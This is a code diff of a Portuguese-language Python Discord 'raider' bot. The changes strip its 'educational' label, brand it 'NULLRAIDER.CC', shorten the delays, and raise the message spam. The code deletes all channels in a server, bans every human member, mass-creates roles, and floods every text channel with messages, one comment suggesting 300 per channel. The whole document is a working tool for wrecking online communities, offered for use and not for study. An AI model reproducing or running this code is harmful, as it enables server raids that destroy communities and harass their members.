@@ -5,12 +5,12 @@ import getpass
 
 # Painel interativo no terminal
 def show_menu():
-    print("\n=== Painel do Bot Discord (Educacional) ===")
-    print("[1] Spam Channels (Deleta todos os canais e cria 10 'raided-lol')")
-    print("[2] Ban Others (Banir todos os membros exceto o bot)")
-    print("[3] UnBan Others (Desbanir todos os membros)")
-    print("[4] Spam Cargos (Criar 10 cargos)")
-    print("[5] Spam Message (Enviar 10 mensagens em todos os canais)")
+    print("\n=== NULLRAIDER.CC RAIDER PANEL ON TOP1!1!1 ===")
+    print("[1] Spam Channels")
+    print("[2] Ban Others")
+    print("[3] UnBan Others")
+    print("[4] Spam Cargos")
+    print("[5] Spam Message")
     print("[0] Sair")
     return input("Escolha uma opção (0-5): ")
 
@@ -65,24 +65,26 @@ async def on_ready():
             print("Opção inválida. Escolha entre 0 e 5.")
 
 async def spam_channels(guild):
-    """Deleta todos os canais e cria 10 canais 'raided-lol'."""
+    """Deleta todos os canais e cria 10 canais '💀 NULLRAIDER.CC 💀' rapidamente."""
     if not guild.me.guild_permissions.manage_channels:
         print("Erro: O bot precisa de permissões de 'Gerenciar Canais'.")
         return
     try:
+        # Deleta canais existentes
         for channel in guild.channels:
             try:
                 await channel.delete()
                 print(f"Canal {channel.name} deletado.")
-                await asyncio.sleep(1)
+                await asyncio.sleep(0.5)  # Atraso reduzido para maior velocidade
             except Exception as e:
                 print(f"Erro ao deletar {channel.name}: {e}")
         
+        # Cria 10 canais rapidamente
         for i in range(10):
-            await guild.create_text_channel(f'raided-lol-{i+1}')
+            await guild.create_text_channel(f'💀 NULLRAIDER.CC WAS HERE 💀-{i+1}')
             print(f"Canal raided-lol-{i+1} criado.")
-            await asyncio.sleep(1)
-        print("Ação concluída: canais deletados e 10 canais 'raided-lol' criados.")
+            await asyncio.sleep(0.5)  # Atraso reduzido
+        print("Sucesso: Spam Channel Ativado!!!")
     except Exception as e:
         print(f"Erro durante a execução: {e}")
 
@@ -93,14 +95,14 @@ async def ban_others(guild):
         return
     try:
         for member in guild.members:
-            if member != guild.me and not member.bot:  # Não bane o próprio bot ou outros bots
+            if member != guild.me and not member.bot:
                 try:
                     await member.ban(reason="Teste educacional")
                     print(f"Membro {member.name} banido.")
-                    await asyncio.sleep(1)
+                    await asyncio.sleep(0.5)
                 except Exception as e:
                     print(f"Erro ao banir {member.name}: {e}")
-        print("Ação concluída: todos os membros banidos (exceto o bot).")
+        print("Ação concluída: todos os membros banidos (exceto o bot)")
     except Exception as e:
         print(f"Erro durante a execução: {e}")
 
@@ -115,7 +117,7 @@ async def unban_others(guild):
             try:
                 await guild.unban(ban_entry.user, reason="Teste educacional")
                 print(f"Usuário {ban_entry.user.name} desbanido.")
-                await asyncio.sleep(1)
+                await asyncio.sleep(0.5)
             except Exception as e:
                 print(f"Erro ao desbanir {ban_entry.user.name}: {e}")
         print("Ação concluída: todos os membros desbanidos.")
@@ -129,28 +131,28 @@ async def spam_cargos(guild):
         return
     try:
         for i in range(10):
-            await guild.create_role(name=f'cargo-lol-{i+1}')
+            await guild.create_role(name=f'💀 NULLRAIDER.CC 💀-{i+1}')
             print(f"Cargo cargo-lol-{i+1} criado.")
-            await asyncio.sleep(1)
+            await asyncio.sleep(0.5)
         print("Ação concluída: 10 cargos criados.")
     except Exception as e:
         print(f"Erro durante a execução: {e}")
 
 async def spam_message(guild):
-    """Envia 10 mensagens em todos os canais de texto."""
+    """Envia 50 mensagens em todos os canais de texto rapidamente."""
     if not guild.me.guild_permissions.send_messages:
         print("Erro: O bot precisa de permissões de 'Enviar Mensagens'.")
         return
     try:
         for channel in guild.text_channels:
             try:
-                for i in range(10):
-                    await channel.send(f"Mensagem de teste {i+1} - Experimento educacional!")
+                for i in range(50):  # 50 mensagens por canal (ajuste para 300 se desejar)
+                    await channel.send(f"NULLRAIDER.CC {i+1} ON TOP!!!!!!")
                     print(f"Mensagem {i+1} enviada em {channel.name}.")
-                    await asyncio.sleep(1)
+                    await asyncio.sleep(0.2)  # Atraso mínimo para evitar rate limits
             except Exception as e:
                 print(f"Erro ao enviar mensagens em {channel.name}: {e}")
-        print("Ação concluída: mensagens enviadas em todos os canais.")
+        print("Ação concluída: Spam Message Ativado!")
     except Exception as e:
         print(f"Erro durante a execução: {e}")
 
